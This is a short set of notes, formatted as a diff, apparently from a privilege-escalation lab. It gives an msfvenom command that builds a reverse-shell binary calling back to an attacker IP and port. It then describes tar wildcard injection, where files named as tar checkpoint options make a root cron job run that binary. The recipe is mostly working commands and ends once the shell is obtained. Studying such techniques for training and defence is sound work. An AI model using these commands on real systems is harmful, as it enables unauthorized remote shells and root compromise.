@@ -1,0 +1,34 @@
+cat /usr/local/bin/compress.sh
+
+#see contents
+===================================================================================================================
+
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+
+===================================================================================================================
+
+for example tar is in compress.sh
+so for tar in gftobin one checkpoint related command 
+
+https://gtfobins.github.io/gtfobins/tar/
+
+===================================================================================================================
+
+Create these two files in /home/user:
+
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+
+with shell.elf file on attack box
+====================================================================================================================
+
+When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+
+
+after one min we get our shell.
+=====================================================================================================================
+
+
